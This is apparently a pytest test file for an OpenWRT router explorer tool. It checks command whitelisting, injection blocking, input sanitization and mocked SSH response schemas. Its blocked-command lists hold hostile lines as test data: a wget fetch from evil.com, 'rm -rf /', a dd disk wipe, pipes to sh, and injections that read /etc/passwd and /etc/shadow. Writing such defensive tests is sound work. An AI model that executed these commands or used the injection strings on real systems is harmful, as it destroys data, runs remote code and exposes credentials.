"""Unit tests for OpenWRT Explorer with mocked SSH responses."""
import json
import re
from datetime import datetime
from typing import Dict, Any, List
import pytest
from tools.openwrt_explorer import OpenWRTExplorer, SecurityValidator


class TestSecurityValidator:
    """Security validation tests for commands."""

    def test_whitelist_patterns(self):
        """Allowed command patterns should pass validation."""
        allowed_commands = [
            "ubus call system board",
            "ubus call network.wireless status",
            "cat /tmp/dhcp.leases",
            "cat /proc/uptime",
            "cat /proc/meminfo",
            "cat /proc/1/comm",
            "uci show dhcp",
            "uci show network",
            "logread -l 50",
            "opkg list-installed",
            "nft list ruleset 2>/dev/null",
            "ping -c 2 -W 2 8.8.8.8",
            "ip route show",
        ]
        
        for cmd in allowed_commands:
            is_valid, msg = SecurityValidator.validate_command(cmd)
            assert is_valid, f"Command should be allowed: {cmd} ({msg})"

    def test_blocked_patterns(self):
        """Dangerous patterns should be blocked."""
        dangerous_commands = [
            "rm -rf /",
            "uci set dhcp.lan.disabled=1",
            "opkg install malware",
            "reboot",
            "wget http://evil.com/malware.sh",
            "cat /etc/passwd | sh",
            "echo test > /etc/config/system",
            "dd if=/dev/zero of=/dev/sda",
        ]
        
        for cmd in dangerous_commands:
            is_valid, msg = SecurityValidator.validate_command(cmd)
            assert not is_valid, f"Command should be blocked: {cmd}"

    def test_command_injection_blocked(self):
        """Command injection attempts must be blocked."""
        injection_attempts = [
            "logread; rm -rf /",
            "logread && reboot",
            "logread || cat /etc/shadow",
            "logread | sh",
            "cat /tmp/$(cat /etc/passwd)",
            "cat /tmp/`id`",
            "ping -c 1 8.8.8.8; rm -rf /",
        ]
        
        for cmd in injection_attempts:
            is_valid, msg = SecurityValidator.validate_command(cmd)
            assert not is_valid, f"Command injection should be blocked: {cmd}"

    def test_command_sanitization(self):
        """Dangerous characters are sanitized from commands."""
        dangerous_input = "logread; rm -rf / && reboot | sh $(cat /etc/passwd)"
        sanitized = SecurityValidator.sanitize_command(dangerous_input)
        
        # Verify that ALL dangerous characters are removed
        dangerous_chars = [';', '&', '|', '$', '(', ')', '<', '>', '`', '{', '}']
        for char in dangerous_chars:
            assert char not in sanitized, f"Dangerous character '{char}' should be removed"

        # Verify sanitized output retains safe words
        assert "logread" in sanitized
        assert "rm" in sanitized  # Word stays but without unsafe characters

    def test_safe_search_term_validation(self):
        """Validate safe and unsafe search terms."""
        safe_terms = ["dhcp", "192.168.0.1", "aa:bb:cc:dd:ee:ff", "device_name", "test-term"]
        for term in safe_terms:
            assert SecurityValidator.is_safe_search_term(term), f"'{term}' should be safe"

        dangerous_terms = ["; rm -rf /", "$(cat /etc/passwd)", "`id`", "test|grep", "a" * 150]
        for term in dangerous_terms:
            assert not SecurityValidator.is_safe_search_term(term), f"'{term}' should be blocked"

    def test_validate_empty_command(self):
        """Empty or non-string command → validation failure."""
        for bad_input in ["", None, 123]:
            is_valid, msg = SecurityValidator.validate_command(bad_input)
            assert not is_valid
            assert "invalid" in msg.lower() or "empty" in msg.lower()


class TestFormatUptime:
    """Tests for static method _format_uptime."""

    def test_zero_seconds(self):
        assert OpenWRTExplorer._format_uptime(0) == "0m"

    def test_minutes_only(self):
        assert OpenWRTExplorer._format_uptime(600) == "10m"

    def test_hours_and_minutes(self):
        result = OpenWRTExplorer._format_uptime(3600 + 1800)  # 1h 30m
        assert "1h" in result and "30m" in result

    def test_days_hours_minutes(self):
        result = OpenWRTExplorer._format_uptime(86400 + 7200 + 60)  # 1d 2h 1m
        assert "1d" in result and "2h" in result and "1m" in result

    def test_days_only(self):
        result = OpenWRTExplorer._format_uptime(86400 * 3)  # 3d exactly
        assert "3d" in result


class TestOpenWRTExplorerMethods:
    """Tests for OpenWRTExplorer methods with mocked SSH."""

    @pytest.mark.asyncio
    async def test_test_connection(self, mock_openwrt_ssh):
        """Test router connection – validate response schema."""
        explorer = OpenWRTExplorer()
        result = await explorer.test_connection()
        
        # Validate response schema
        assert result["success"] is True
        assert result["status"] == "connected"
        assert "host" in result
        assert "model" in result
        assert "release" in result

    @pytest.mark.asyncio
    async def test_get_system_info(self, mock_openwrt_ssh, openwrt_test_data):
        """Test system info response schema."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_system_info()
        
        # Walidacja schematu
        assert result["success"] is True
        assert "model" in result
        assert "hostname" in result
        assert "openwrt_version" in result
        assert "kernel" in result
        assert "uptime_seconds" in result and isinstance(result["uptime_seconds"], (int, float))
        assert "uptime" in result
        
        # Memory validation – accept either percentage or raw bytes
        has_memory_percent = "memory_used_percent" in result
        has_memory_bytes = "memory_total_bytes" in result and "memory_free_bytes" in result

        assert has_memory_percent or has_memory_bytes, "No memory information in response"
        
        if has_memory_percent:
            assert 0 <= result["memory_used_percent"] <= 100
        
        if has_memory_bytes:
            assert result["memory_total_bytes"] > 0

    @pytest.mark.asyncio
    async def test_get_wifi_status(self, mock_openwrt_ssh):
        """Test WiFi status response."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_wifi_status()
        
        assert result["success"] is True
        assert "interfaces" in result
        assert isinstance(result["interfaces"], list)
        
        if result["interfaces"]:
            iface = result["interfaces"][0]
            # Flexible validation – different fields across OpenWrt versions
            assert any(k in iface for k in ["ssid", "radio", "ifname", "type"])
            assert "clients_count" in iface

    @pytest.mark.asyncio
    async def test_list_dhcp_leases(self, mock_openwrt_ssh):
        """Test DHCP leases response format."""
        explorer = OpenWRTExplorer()
        result = await explorer.list_dhcp_leases()
        
        assert result["success"] is True
        assert "leases_count" in result and isinstance(result["leases_count"], int)
        assert "leases" in result and isinstance(result["leases"], list)
        
        for lease in result["leases"]:
            assert "expires_at" in lease
            assert "mac" in lease
            assert "ip" in lease
            # Key must exist; value may be None when dnsmasq reports "*"
            assert "hostname" in lease

    @pytest.mark.asyncio
    async def test_get_firewall_rules(self, mock_openwrt_ssh):
        """Test firewall rules – handles both iptables and nftables."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_firewall_rules()
        
        assert result["success"] is True
        assert "firewall_type" in result
        assert result["firewall_type"] in ["iptables", "nftables", "fw4"]
        assert "rules_preview" in result and isinstance(result["rules_preview"], str)
        assert "full_output_truncated" in result and isinstance(result["full_output_truncated"], bool)

    @pytest.mark.asyncio
    async def test_read_uci_config(self, mock_openwrt_ssh):
        """Test reading a UCI configuration."""
        explorer = OpenWRTExplorer()
        result = await explorer.read_uci_config("dhcp")
        
        assert result["success"] is True
        assert result["config_name"] == "dhcp"
        assert "entries_count" in result and isinstance(result["entries_count"], int)
        assert "sample" in result and isinstance(result["sample"], dict)

    @pytest.mark.asyncio
    async def test_read_uci_config_invalid(self, mock_openwrt_ssh):
        """Test reading an unsupported UCI configuration."""
        explorer = OpenWRTExplorer()
        result = await explorer.read_uci_config("invalid_config_xyz")
        
        assert result["success"] is False
        assert "error" in result
        assert "not supported" in result["error"].lower() or "allowed" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_list_installed_packages(self, mock_openwrt_ssh):
        """Test installed package list response."""
        explorer = OpenWRTExplorer()
        result = await explorer.list_installed_packages()
        
        assert result["success"] is True
        assert "packages_count" in result and isinstance(result["packages_count"], int)
        assert "packages_sample" in result
        
        for pkg in result["packages_sample"]:
            assert "name" in pkg
            assert "version" in pkg

    @pytest.mark.asyncio
    async def test_get_router_logs(self, mock_openwrt_ssh):
        """Test router system logs response."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_router_logs(lines=50, filter_level="all")
        
        assert result["success"] is True
        assert "lines_count" in result
        assert "logs" in result

    @pytest.mark.asyncio
    async def test_search_router_logs(self, mock_openwrt_ssh):
        """Test log search with input sanitization."""
        explorer = OpenWRTExplorer()

        # Safe search term
        result = await explorer.search_router_logs(search_term="dhcp", max_results=10)
        assert result["success"] is True
        assert result["search_term"] == "dhcp"

        # Unsafe search term – should be blocked
        result = await explorer.search_router_logs(search_term="; rm -rf /", max_results=10)
        assert result["success"] is False
        assert "error" in result

    @pytest.mark.asyncio
    async def test_diagnose_router_connectivity(self, mock_openwrt_ssh):
        """Test network connectivity diagnostics."""
        explorer = OpenWRTExplorer()
        result = await explorer.diagnose_router_connectivity()
        
        assert result["success"] is True
        assert "tests" in result
        assert "summary" in result
        assert "passed" in result["summary"]
        assert "failed" in result["summary"]
        assert "total" in result["summary"]
        assert "health" in result["summary"]

    @pytest.mark.asyncio
    async def test_get_dhcp_static_leases(self, mock_openwrt_ssh):
        """Test DHCP static reservations response."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_dhcp_static_leases()
        
        assert result["success"] is True
        assert "static_leases_count" in result
        assert "leases" in result

    @pytest.mark.asyncio
    async def test_search_dhcp_logs(self, mock_openwrt_ssh):
        """Test searching DHCP events in logs."""
        explorer = OpenWRTExplorer()
        result = await explorer.search_dhcp_logs(search_term="aa:bb:cc:dd:ee:01", hours_back=24)
        
        assert result["success"] is True
        assert "events_found" in result
        assert "events" in result

    @pytest.mark.asyncio
    async def test_get_device_dhcp_details(self, mock_openwrt_ssh):
        """Test DHCP device details by MAC address."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_device_dhcp_details(mac_address="aa:bb:cc:dd:ee:01")
        
        assert result["success"] is True
        assert "device_identifier" in result
        assert "is_currently_connected" in result

    @pytest.mark.asyncio
    async def test_get_device_dhcp_details_no_params(self, mock_openwrt_ssh):
        """Test DHCP device details with no parameters provided."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_device_dhcp_details()

        assert result["success"] is False
        assert "error" in result

    @pytest.mark.asyncio
    async def test_get_device_dhcp_details_invalid_mac(self, mock_openwrt_ssh):
        """Invalid MAC format → validation error with 'mac' in message."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_device_dhcp_details(mac_address="not-a-mac")
        assert result["success"] is False
        assert "mac" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_get_device_dhcp_details_by_ip(self, mock_openwrt_ssh):
        """Lookup by ip_address instead of MAC should succeed."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_device_dhcp_details(ip_address="192.168.1.100")
        assert result["success"] is True
        assert result["device_identifier"] == "192.168.1.100"

    @pytest.mark.asyncio
    async def test_get_device_dhcp_details_invalid_ip(self, mock_openwrt_ssh):
        """Invalid IP format → validation error with 'ip' in message."""
        explorer = OpenWRTExplorer()
        result = await explorer.get_device_dhcp_details(ip_address="999.999.999")
        assert result["success"] is False
        assert "ip" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_search_dhcp_logs_invalid_term(self, mock_openwrt_ssh):
        """Unsafe search_term in search_dhcp_logs → error response."""
        explorer = OpenWRTExplorer()
        result = await explorer.search_dhcp_logs(search_term="; rm -rf /", hours_back=1)
        assert result["success"] is False
        assert "error" in result


class TestResponseValidation:
    """Tests for response format validation based on real data."""

    def test_validate_system_info_schema(self, openwrt_test_data):
        """Validate get_system_info response schema against real data."""
        data = openwrt_test_data["get_system_info"]

        required_fields = ["success", "model", "hostname", "openwrt_version", "kernel", "uptime_seconds", "uptime"]
        for field in required_fields:
            assert field in data, f"Required field missing: {field}"
        
        assert isinstance(data["success"], bool)

    def test_validate_dhcp_leases_schema(self, openwrt_test_data):
        """Validate list_dhcp_leases response schema."""
        data = openwrt_test_data["list_dhcp_leases"]

        assert data["success"] is True
        assert "leases_count" in data
        assert isinstance(data["leases"], list)

        # Verify hostname "*" is handled (dnsmasq uses "*" for unnamed devices)
        for lease in data["leases"]:
            assert "mac" in lease
            assert "ip" in lease
            # hostname may be "*" or None

    def test_validate_connectivity_schema(self, openwrt_test_data):
        """Validate diagnose_router_connectivity response schema."""
        data = openwrt_test_data["diagnose_router_connectivity"]
        
        assert data["success"] is True
        assert "tests" in data
        assert "summary" in data
        assert "health" in data["summary"]